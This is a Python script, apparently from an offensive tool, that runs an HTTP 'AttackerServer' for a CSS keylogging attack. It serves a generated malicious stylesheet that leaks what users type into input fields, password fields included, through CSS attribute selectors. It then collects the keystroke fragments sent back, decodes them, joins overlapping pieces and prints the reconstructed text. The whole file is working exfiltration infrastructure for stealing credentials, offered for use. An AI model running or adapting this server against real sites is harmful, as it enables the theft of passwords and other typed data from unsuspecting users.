#!/usr/bin/python3
from generator import generate_payload, generate_keys
from http.server import BaseHTTPRequestHandler, HTTPServer
import argparse, logging, math, urllib.parse, re, os, json

description = '''Start server to receive key strokes inside password input fields:
\tpython3 server.py freq_en.json -e input -a value -t password
Start server to receive key strokes inside any input field:
\tpython3 server.py freq_en.json -e input -a value'''

# Initialize argument parsing
class CustomFormatter(argparse.ArgumentDefaultsHelpFormatter, argparse.RawDescriptionHelpFormatter): pass
parser = argparse.ArgumentParser(
    epilog=description,
    formatter_class=CustomFormatter,
    description="Exfiltration server to steal keystrokes using pure CSS")

scan_group = parser.add_argument_group('PARAMETERS')
parser.add_argument("input", type = str, default="freq_en.json", help="Input JSON file that contains histogram of frequent character combinations (can be generated using frequency_analyzer.py)")
parser.add_argument("-e", "--element", type = str, default="input", help="Element, class or id to exfiltrate (e.g. input, .class, #id)")
parser.add_argument("-a", "--attribute", type = str, default="value", help="Attribute name to log (e.g. value)")
parser.add_argument("-t", "--type", type = str, help="Type of the element (e.g. text, password)")
parser.add_argument("-n", "--num-selectors", type = int, default=5000, help="Maximum number of selectors to generate")
parser.add_argument("-v", "--verbose",  action='store_true', help="Increase output verbosity")

general_group = parser.add_argument_group("NETWORK")
parser.add_argument("-p", "--port", type = int, default=8000, help="Port to listen on")
parser.add_argument("-l", "--listen", type = str, default="127.0.0.1", help="IP to listen on")

args = parser.parse_args()

params = {
    "num_selectors": args.num_selectors,
    "attribute": args.attribute,
    "element": args.element,
    "e_type": args.type,
    "ip": args.listen,
    "port": args.port
}

# Initialize logging
logger = logging.getLogger(__name__)
logger.setLevel(args.verbose and logging.DEBUG or logging.INFO)
formatter = logging.Formatter('%(levelname)s: [SERVER] %(message)s')
handler = logging.StreamHandler()
handler.setFormatter(formatter)
logger.addHandler(handler)

# Check if file exists
if not os.path.isfile(args.input):
    logger.error(f"File {args.input} does not exist")
    exit(1)

# Load JSON file
combinations = None
with open(args.input, "r") as f:
    combinations = json.load(f)
assert combinations, f"Failed to read JSON file {args.input}"
# Print some statistics
if args.verbose:
    generate_keys(combinations.copy(), args.num_selectors, logger=logger)

# Global variable to store keystrokes
keystrokes = ""

def merge_stroke(stroke):
    global keystrokes

    # abc + d -> abcd
    if len(stroke) == 1:
        logger.debug(f"{keystrokes} + {stroke} -> {keystrokes + stroke}")
        keystrokes += stroke
    # abc + bcd -> abcd
    # abc + def -> abcdef
    else:
        # Check how many characters are common
        common = 0
        for i in range(min(len(stroke), len(keystrokes)), 0, -1):
            if keystrokes.endswith(stroke[:i]):
                common = i
                break
        # Add the remaining characters
        logger.debug(f"{keystrokes} + {stroke} -> {keystrokes + stroke[common:]}")
        keystrokes += stroke[common:]

    print(f"Keystrokes: {keystrokes}")


class AttackerServer(BaseHTTPRequestHandler):
    def do_GET(self):
        # get client ip and url parameters
        client_ip = self.client_address[0]
        url_parameters = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
        path = self.path

        self.handle_request(client_ip, url_parameters, path)

    def do_POST(self):
        # get client ip and post data
        client_ip = self.client_address[0]
        content_length = int(self.headers['Content-Length'])
        post_data = urllib.parse.parse_qs(self.rfile.read(content_length).decode('utf-8'))
        path = self.path

        self.handle_request(client_ip, post_data, path)

    def handle_request(self, client_ip:str, parameters:dict, path:str):
        response = ""
        self.send_response(200)

        # client sent key stroke
        if 'k' in parameters:
            logger.debug(f"Received key stroke from {client_ip}: {parameters['k'][0]}")
            keys = parameters['k'][0].split(',')
            # Convert to characters
            stroke = "".join([chr(int(k, 16)) for k in keys])
            merge_stroke(stroke)

            self.send_header('Content-type', 'image/svg+xml')
            self.send_header('Cache-Control', 'no-store, must-revalidate')
            self.send_header('Expires', '0')
            # response with empty svg (quite useless, but the requests won't get displayed as failed in the devtools)
            response = '<?xml version="1.0" encoding="UTF-8"?>\n<svg xmlns="http://www.w3.org/2000/svg" width="0" height="0"></svg>'
        # client requests malicious payload
        elif path == "/style.css":
            # Reset keystrokes
            global keystrokes
            keystrokes = ""

            logger.info(f"Start generating payload for {client_ip}")
            response = generate_payload(combinations.copy(), **params)
            logger.info(f"Payload for {client_ip} generated. Size: {len(response) / 1024:.2f} KB")
            self.send_header('Content-type', 'text/css')
        else:
            self.send_header('Content-type', 'text/plain')

        # respond to client
        self.end_headers()
        self.wfile.write(response.encode('utf-8'))

def run( ip: str, port: int, server_class=HTTPServer, handler_class=AttackerServer):
    server_address = (ip, port)
    httpd = server_class(server_address, handler_class)
    logger.info('Starting http server...')
    httpd.serve_forever()

run(args.listen, args.port)
